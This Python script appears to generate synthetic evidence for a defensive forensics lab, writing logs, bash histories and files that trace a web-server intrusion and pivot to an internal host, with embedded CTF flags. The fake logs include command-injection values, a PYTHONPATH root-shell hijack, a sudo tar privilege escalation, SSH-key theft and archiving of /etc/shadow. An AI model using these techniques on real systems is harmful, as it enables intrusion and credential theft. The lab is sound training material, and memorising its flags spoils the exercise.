#!/usr/bin/env python3
"""
Observ Incident -- evidence generator (Grimoire / defensive lab).

Deterministically writes the triage evidence bundle a learner investigates.
The scenario is the defender's view of the "Observ" intrusion: a monitoring
web server (web01) was compromised through its diagnostics page and used to
pivot to an internal backup host (internal01).

Two OS{...} flags are embedded in the telemetry and are only recoverable by
correct analysis (one base64-encoded in an app debug log, one in a staged
exfil note on the internal host).

Usage:  python3 generate_evidence.py [output_dir]   (default: ./evidence)
"""
import base64
import os
import sys

# ---- scenario constants ---------------------------------------------------
ATTACKER_IP = "10.10.14.7"
WEB01_EXT = "192.168.56.10"
WEB01_INT = "172.20.0.2"
INTERNAL_IP = "172.20.0.3"
DAY = "2026-09-14"

FLAG_WEB01 = "OS{w3b01_rc3_d14g_c0mm4nd_1nj}"       # hidden base64 in app debug log
FLAG_INTERNAL = "OS{1nt3rn4l_r00t_sud0_tar_pivot}"  # hidden in staged exfil note

B64_WEB01 = base64.b64encode(FLAG_WEB01.encode()).decode()


def w(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content.rstrip("\n") + "\n")
    print(f"[+] wrote {path}")


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "evidence"

    # --- web01: apache access log (external view) --------------------------
    ua = '"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"'
    w(f"{out}/web01/var/log/apache2/access.log", "\n".join([
        f'{ATTACKER_IP} - - [14/Sep/2026:02:13:55 +0000] "GET / HTTP/1.1" 200 812 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:14:02 +0000] "GET /robots.txt HTTP/1.1" 200 56 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:14:09 +0000] "GET /monitor/ HTTP/1.1" 302 0 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:14:20 +0000] "POST /index.php HTTP/1.1" 200 790 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:14:25 +0000] "POST /index.php HTTP/1.1" 302 0 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:14:26 +0000] "GET /monitor/dashboard.php HTTP/1.1" 200 1544 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:15:01 +0000] "POST /monitor/diag.php HTTP/1.1" 200 980 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:15:40 +0000] "POST /monitor/diag.php HTTP/1.1" 200 1320 "-" {ua}',
        f'{ATTACKER_IP} - - [14/Sep/2026:02:16:12 +0000] "POST /monitor/diag.php HTTP/1.1" 200 1020 "-" {ua}',
        f'10.10.10.5 - - [14/Sep/2026:02:20:00 +0000] "GET /monitor/dashboard.php HTTP/1.1" 200 1544 "-" {ua}',
    ]))

    # --- web01: application debug log (reveals the injected host= values) --
    w(f"{out}/web01/var/log/observ/diag_debug.log", "\n".join([
        f"{DAY} 02:14:48 [diag] host=8.8.8.8",
        f"{DAY} 02:15:01 [diag] host=127.0.0.1; id",
        f"{DAY} 02:15:20 [diag] host=127.0.0.1; uname -a",
        f"{DAY} 02:15:40 [diag] host=127.0.0.1; cat /var/www/html/config.php",
        # attacker stages a canary marker (base64). Decoding reveals FLAG_WEB01.
        f"{DAY} 02:16:12 [diag] host=127.0.0.1; echo {B64_WEB01} | base64 -d > /tmp/.obs_marker",
    ]))

    # --- web01: auth log ---------------------------------------------------
    w(f"{out}/web01/var/log/auth.log", "\n".join([
        f"Sep 14 02:17:03 web01 sshd[2041]: Accepted password for developer from {ATTACKER_IP} port 51044 ssh2",
        f"Sep 14 02:17:03 web01 sshd[2041]: pam_unix(sshd:session): session opened for user developer(uid=1000) by (uid=0)",
        "Sep 14 02:18:22 web01 sudo:  developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; "
        "ENV=PYTHONPATH=/tmp/.x ; COMMAND=/usr/bin/python3 /opt/health/check.py",
        "Sep 14 02:18:22 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by developer(uid=1000)",
        f"Sep 14 02:20:51 web01 sshd[2041]: pam_unix(sshd:session): session closed for user developer",
    ]))

    # --- web01: developer bash history ------------------------------------
    w(f"{out}/web01/home/developer/.bash_history", "\n".join([
        "id", "sudo -l",
        "cat /var/www/html/config.php",
        "mkdir -p /tmp/.x",
        'echo "import os; os.setuid(0); os.system(\'/bin/bash\')" > /tmp/.x/netcheck.py',
        "sudo PYTHONPATH=/tmp/.x /usr/bin/python3 /opt/health/check.py",
        "cat /root/proof.txt",
        "cat ~/.ssh/config", "cat ~/.ssh/svc_backup_id_ed25519",
        f"ssh -i ~/.ssh/svc_backup_id_ed25519 svc_backup@{INTERNAL_IP}",
    ]))

    # --- web01: recovered malicious module (from /tmp/.x) ------------------
    w(f"{out}/web01/tmp/.x/netcheck.py",
      "import os\nos.setuid(0)\nos.system('/bin/bash')\n")

    # --- web01: app config (context: reused credential) -------------------
    w(f"{out}/web01/var/www/html/config.php", "\n".join([
        "<?php",
        "$DB_HOST = '127.0.0.1';",
        "$DB_USER = 'observ_app';",
        "$DB_PASS = 'Pr0dDbAcc3ss!2023';",
        "$DB_NAME = 'observ';",
    ]))

    # --- internal01: auth log (pivot in) ----------------------------------
    w(f"{out}/internal01/var/log/auth.log", "\n".join([
        f"Sep 14 02:19:40 internal01 sshd[1555]: Accepted publickey for svc_backup from {WEB01_INT} port 40122 ssh2: "
        "ED25519 SHA256:9Qd7s0c0mPuT3dF1ng3rPr1ntV4lu3abcd",
        "Sep 14 02:19:40 internal01 sshd[1555]: pam_unix(sshd:session): session opened for user svc_backup(uid=1001) by (uid=0)",
        "Sep 14 02:21:10 internal01 sudo:  svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; "
        "COMMAND=/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "Sep 14 02:21:10 internal01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc_backup(uid=1001)",
    ]))

    # --- internal01: svc_backup bash history + staged exfil note ----------
    w(f"{out}/internal01/home/svc_backup/.bash_history", "\n".join([
        "id", "hostname", "ip addr", "sudo -l",
        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "cat /root/proof.txt",
        "mkdir -p /tmp/.exfil",
        f"echo {FLAG_INTERNAL} > /tmp/.exfil/stage.txt",
        "tar czf /tmp/.exfil/backup.tgz /root /etc/shadow 2>/dev/null",
    ]))

    # --- internal01: the staged file the attacker left behind -------------
    w(f"{out}/internal01/tmp/.exfil/stage.txt", FLAG_INTERNAL)

    print("\n[*] evidence generated under:", out)
    print("[*] (flags are embedded; see answer-key.md for the solution)")


if __name__ == "__main__":
    main()
